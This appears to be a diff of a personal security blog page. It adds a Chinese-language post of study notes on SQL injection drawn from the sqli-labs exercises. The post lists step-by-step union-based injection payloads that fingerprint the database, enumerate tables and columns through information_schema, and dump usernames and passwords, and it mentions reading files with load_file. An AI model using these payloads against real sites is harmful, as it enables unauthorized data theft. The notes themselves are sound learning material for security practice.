@@ -13,7 +13,7 @@
   
   <title>
     
-      archive_a: 2019/7 
+      Brief Discussion on SQL Injection 
       
       
       |
@@ -113,341 +113,165 @@
 
 
       <div class="flex-container">
-        <!-- 归档页，展示本站所有文章，按照年份降序归类，url形式：https://yoursite/archives/ -->
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
 
-<!-- last: 按年份把文章分组，当前遍历到的年份 -->
-<!-- now: 当前遍历到的文章的发布年份 -->
 
-<div class="container archives">
-  <div class="post-list">
-    
-        <!-- 后续文章的发布年份呈现 -->
-        <div class="content-title">
-          <h2>
-            <span>2024</span>
-          </h2>
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.10/dist/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Brief Discussion on SQL Injection</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2024-04-21 01:13:57
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/Notes/" title="Notes">
+                    #Notes
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <p><strong>sqli-labs是我对sql学习程度的检验，玩了几道题，我查询了相关知识点,总结了一些重要的语法以及知识点，还有类似的题型解法步骤，下面我将一一汇总</strong></p>
+<h2 id="SQL注入漏洞产生的原因"><a href="#SQL注入漏洞产生的原因" class="headerlink" title="SQL注入漏洞产生的原因"></a>SQL注入漏洞产生的原因</h2><p>SQL Injection<br>    程序员在编写代码的时候，没有对用户输入数据的合法性进行判断，使应用程序存在安全隐患<br>    用户可以提交一段数据库查询代码，根据程序返回的结果，获得某些他想得知的数据或进行数据库操作</p>
+<h2 id="SQL语句"><a href="#SQL语句" class="headerlink" title="SQL语句"></a>SQL语句</h2><p>Structured Query Language<br>    结构化的查询语言，是关系型数据库通讯的标准语言。<br>        查询：<code>SELECT statement FROM table WHERE condition</code><br>        删除记录：<code>DELETE FROM table WHERE condition</code><br>        更新记录：<code>UPDATE table SET field=value WHERE condtion</code><br>        添加记录：<code>INSERT INTO table field VALUES(values)</code></p>
+<h2 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h2><p>1首先测试正常数据，如<code>?id=1</code><br>2)判断是否存在注入点，如在<code>?id=1+【‘】、【and 1=1】或【and 1=2】</code><br>3)判断字段长度,列数如在<code>?id=1+【‘】+【 order by 1 (数字任意)】，id=1‘ order by 1=1 # ,id=1&#39; order by 1=2 #</code><br>4判断字段回显位置，如在<code>?id=1+【‘】+【union select 1,2,3,4,5,6,7,8,9,10,11#】</code><br>5） 判断数据库信息：<br>利用内置函数暴数据库信息<br><strong>version()版本；database()数据库；user()用户；</strong><br>不用猜解可用字段暴数据库信息(有些网站不适用):<br><code>and 1=2 union all select version()</code><br><code>and 1=2 union all select database()</code><br><code>and 1=2 union all select user()</code><br>操作系统信息：<code>and 1=2 union all select @@global.version_compile_os from mysql.user</code><br>数据库权限：</p>
+<figure class="highlight plaintext"><figcaption><span>ord(mid(user(),1,1))</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">6） 查找数据库名</span><br><span class="line">Mysql 5 以上有内置库 information_schema，存储着mysql的所有数据库和表结构信息```union select information_schema from information_schema.schemata``` （语句在显示位）</span><br><span class="line">7)查找数据库表名</span><br><span class="line">```union select group_concat(table_name) from information_schema.tables where table_schema=database()```</span><br><span class="line">8)查找列名</span><br><span class="line">```union select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; --+```</span><br><span class="line">9)获取值</span><br><span class="line">```union select group_concat(username,password) from users--+```</span><br><span class="line">或者```1&#x27; union select 1,(select 列名 from 表名),3,4#```</span><br><span class="line">0)查找数据库表中所有字段以及字段值</span><br><span class="line"></span><br><span class="line">```sql</span><br><span class="line">and 1=2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from information_schema.TABLES where TABLE_SCHEMA=数据库（十六进制） limit 0（开始的记录，0为第一个开始记录）,1（显示1条记录）—</span><br><span class="line">and 1=2 Union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from information_schema.COLUMNS where TABLE_NAME=表名（十六进制）limit 0,1</span><br></pre></td></tr></table></figure>
+
+<p><strong>提权</strong><br>01)猜解账号密码；<br>02） 登陆管理员后台。<br>读文件： union select 绝对路径 load_file<br>写入文件：union select</p>
+<h2 id="判断SQL注入点"><a href="#判断SQL注入点" class="headerlink" title="判断SQL注入点"></a>判断SQL注入点</h2><p>找注入点是最关键,也最基础的一个环节<br>本质原理是:<br>    找一个需要后台处理后<br>    提交给数据库的点<br>    所有的输入只要和数据库进行交互的，都有可能触发SQL注入<br>一般为三大类</p>
+<pre><code>Get参数触发SQL注入
+POST参数触发SQL注入
+Cookie触发SQL注入
+</code></pre>
+<p>例如:<br>    在常规的链接的参数中(链接?参数) 找形如?id&#x3D;num的【,】搜索框的【,】<br>而验证是否存在注入点的方法有很多种<br>最常规,也最简单的方法，引入单引号判断是否存在注入点</p>
+<pre><code>http://host/test.php?id=100’ 返回错误说明有可能注入
+
+http://host/test.php?id=100 and 1=1 返回正常
+
+http://host/test.php?id=100 and 1=2返回错误
+</code></pre>
+<p>如果满足上面三点，是注入点的可能性就很高了</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2018/12/10/NYSEC-2018-Web/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2024-04-21 01:13:57
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/Notes/" title="Notes">
+                        #Notes
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2019/01/17/Discussion-on-GET-and-POST/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
         </div>
       
-      <div class="post-item" title="">
-        <div class="time-m-d">04-21</div>
-        <div class="title">
-          <a href="/2024/04/21/SQL-Injection-Types/">
-            <span></span>
-          </a>
-        </div>
-      </div>
+    </div>
     
-        <!-- 后续文章的发布年份呈现 -->
-        <div class="content-title">
-          <h2>
-            <span>2020</span>
-          </h2>
-        </div>
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
       
-      <div class="post-item" title="File Parsing Vulnerabilities">
-        <div class="time-m-d">07-02</div>
-        <div class="title">
-          <a href="/2020/07/02/File-Parsing-Vulnerabilities/">
-            <span>File Parsing Vulnerabilities</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="PHP Protocols and File Inclusion Vulnerabilities">
-        <div class="time-m-d">05-25</div>
-        <div class="title">
-          <a href="/2020/05/25/PHP-Protocols-and-File-Inclusion-Vulnerabilities/">
-            <span>PHP Protocols and File Inclusion Vulnerabilities</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="From Basics to Attack: XML Entity Injection">
-        <div class="time-m-d">05-20</div>
-        <div class="title">
-          <a href="/2020/05/20/From-Basics-to-Attack-XML-Entity-Injection/">
-            <span>From Basics to Attack: XML Entity Injection</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="2020HW Cheat Sheet">
-        <div class="time-m-d">05-14</div>
-        <div class="title">
-          <a href="/2020/05/14/2020HW-Cheat-Sheet/">
-            <span>2020HW Cheat Sheet</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="L0kiTown v1.0">
-        <div class="time-m-d">05-13</div>
-        <div class="title">
-          <a href="/2020/05/13/L0kiTown-v1.0/">
-            <span>L0kiTown v1.0</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="From Basics to Analysis with Wireshark">
-        <div class="time-m-d">05-05</div>
-        <div class="title">
-          <a href="/2020/05/05/From-Basics-to-Analysis-with-Wireshark/">
-            <span>From Basics to Analysis with Wireshark</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="Introduction to Mini Program Development[1]">
-        <div class="time-m-d">03-20</div>
-        <div class="title">
-          <a href="/2020/03/20/Introduction-to-Mini-Program-Development/">
-            <span>Introduction to Mini Program Development[1]</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="Introduction to Mini Program Development[2]">
-        <div class="time-m-d">03-20</div>
-        <div class="title">
-          <a href="/2020/03/20/Introduction-to-Mini-Program-Development-2/">
-            <span>Introduction to Mini Program Development[2]</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="Memory Forensics">
-        <div class="time-m-d">01-10</div>
-        <div class="title">
-          <a href="/2020/01/10/Memory-Forensics/">
-            <span>Memory Forensics</span>
-          </a>
-        </div>
-      </div>
-    
-        <!-- 后续文章的发布年份呈现 -->
-        <div class="content-title">
-          <h2>
-            <span>2019</span>
-          </h2>
-        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="toc-text">SQL注入漏洞产生的原因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E8%AF%AD%E5%8F%A5"><span class="toc-text">SQL语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%AD%A5%E9%AA%A4"><span class="toc-text">注入步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%ADSQL%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-text">判断SQL注入点</span></a></li></ol>
       
-      <div class="post-item" title="Notes on Gathering Information [1]">
-        <div class="time-m-d">09-23</div>
-        <div class="title">
-          <a href="/2019/09/23/Notes-on-Gathering-Information/">
-            <span>Notes on Gathering Information [1]</span>
-          </a>
-        </div>
-      </div>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
     
-      <div class="post-item" title="Kali Updating Sources">
-        <div class="time-m-d">09-09</div>
-        <div class="title">
-          <a href="/2019/09/09/Kali-Updating-Sources/">
-            <span>Kali Updating Sources</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="Learning Code Auditing [1]">
-        <div class="time-m-d">07-25</div>
-        <div class="title">
-          <a href="/2019/07/25/Learning-Code-Auditing-1/">
-            <span>Learning Code Auditing [1]</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="Setting Up an Intranet Server Using Docker">
-        <div class="time-m-d">05-14</div>
-        <div class="title">
-          <a href="/2019/05/14/Setting-Up-an-Intranet-Server-Using-Docker/">
-            <span>Setting Up an Intranet Server Using Docker</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="Introduction to Penetration Testing">
-        <div class="time-m-d">05-14</div>
-        <div class="title">
-          <a href="/2019/05/14/Introduction-to-Penetration-Testing/">
-            <span>Introduction to Penetration Testing</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="ISCC 2019-MISC">
-        <div class="time-m-d">05-14</div>
-        <div class="title">
-          <a href="/2019/05/14/ISCC2019-MISC/">
-            <span>ISCC 2019-MISC</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="Troubleshooting Docker Installation on Kali Linux">
-        <div class="time-m-d">05-14</div>
-        <div class="title">
-          <a href="/2019/05/14/Troubleshooting-Docker-Installation-on-Kali-Linux/">
-            <span>Troubleshooting Docker Installation on Kali Linux</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="2019 Jiaweisi Cup Web">
-        <div class="time-m-d">03-20</div>
-        <div class="title">
-          <a href="/2019/03/20/2019-Jiaweisi-Cup-Web/">
-            <span>2019 Jiaweisi Cup Web</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="XSS-Wooyun Practice">
-        <div class="time-m-d">03-14</div>
-        <div class="title">
-          <a href="/2019/03/14/XSS-Wooyun-Practice/">
-            <span>XSS-Wooyun Practice</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="XSS Cross-Site Attacks">
-        <div class="time-m-d">03-09</div>
-        <div class="title">
-          <a href="/2019/03/09/XSS-Cross-Site-Attacks/">
-            <span>XSS Cross-Site Attacks</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="WPSEC 2019 Web">
-        <div class="time-m-d">03-04</div>
-        <div class="title">
-          <a href="/2019/03/04/WPSEC-2019-Web/">
-            <span>WPSEC 2019 Web</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="How to Insert a Sentence into a Picture in Win10">
-        <div class="time-m-d">02-27</div>
-        <div class="title">
-          <a href="/2019/02/27/How-to-Insert-a-Sentence-into-a-Picture-in-Win10/">
-            <span>How to Insert a Sentence into a Picture in Win10</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="Sql Lab(41-65)">
-        <div class="time-m-d">02-26</div>
-        <div class="title">
-          <a href="/2019/02/26/sql-lab(41-65)/">
-            <span>Sql Lab(41-65)</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="SQL Injection Functions">
-        <div class="time-m-d">01-22</div>
-        <div class="title">
-          <a href="/2019/01/22/SQL-Injection-Functions/">
-            <span>SQL Injection Functions</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="Twelve Types of Error Injection and Universal Statements">
-        <div class="time-m-d">01-22</div>
-        <div class="title">
-          <a href="/2019/01/22/12-Types-of-Error-Injection-and-Universal-Statements/">
-            <span>Twelve Types of Error Injection and Universal Statements</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="Detailed Discussion on information_schema">
-        <div class="time-m-d">01-22</div>
-        <div class="title">
-          <a href="/2019/01/22/Detailed-Discussion-on-information_schema/">
-            <span>Detailed Discussion on information_schema</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="Sql Lab(1-20)">
-        <div class="time-m-d">01-20</div>
-        <div class="title">
-          <a href="/2019/01/20/sql-lab(1-20)/">
-            <span>Sql Lab(1-20)</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="Sql Lab(21-40)">
-        <div class="time-m-d">01-20</div>
-        <div class="title">
-          <a href="/2019/01/20/sql-lab(21-40)/">
-            <span>Sql Lab(21-40)</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="HTML Quick Reference Notes">
-        <div class="time-m-d">01-19</div>
-        <div class="title">
-          <a href="/2019/01/19/HTML-Quick-Reference-Notes/">
-            <span>HTML Quick Reference Notes</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="Discussion on GET and POST">
-        <div class="time-m-d">01-17</div>
-        <div class="title">
-          <a href="/2019/01/17/Discussion-on-GET-and-POST/">
-            <span>Discussion on GET and POST</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="Brief Discussion on SQL Injection">
-        <div class="time-m-d">01-14</div>
-        <div class="title">
-          <a href="/2019/01/14/Brief-Discussion-on-SQL-Injection/">
-            <span>Brief Discussion on SQL Injection</span>
-          </a>
-        </div>
-      </div>
-    
-        <!-- 后续文章的发布年份呈现 -->
-        <div class="content-title">
-          <h2>
-            <span>2018</span>
-          </h2>
-        </div>
-      
-      <div class="post-item" title="NYSEC 2018 Web">
-        <div class="time-m-d">12-10</div>
-        <div class="title">
-          <a href="/2018/12/10/NYSEC-2018-Web/">
-            <span>NYSEC 2018 Web</span>
-          </a>
-        </div>
-      </div>
-    
-      <div class="post-item" title="JAVA Environment Variable Configuration">
-        <div class="time-m-d">12-08</div>
-        <div class="title">
-          <a href="/2018/12/08/JAVA-Environment-Variable-Configuration/">
-            <span>JAVA Environment Variable Configuration</span>
-          </a>
-        </div>
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
       </div>
     
   </div>
-</div>
+
 
         
 <div class="footer">
@@ -697,6 +521,24 @@
 
 
         
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Brief%20Discussion%20on%20SQL%20Injection + '&url=' + https%3A%2F%2Fl0ki.net%2F2019%2F01%2F14%2FBrief-Discussion-on-SQL-Injection%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://l0ki.net/2019/01/14/Brief-Discussion-on-SQL-Injection/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
   
   
 <script src="/js/shares.js"></script>
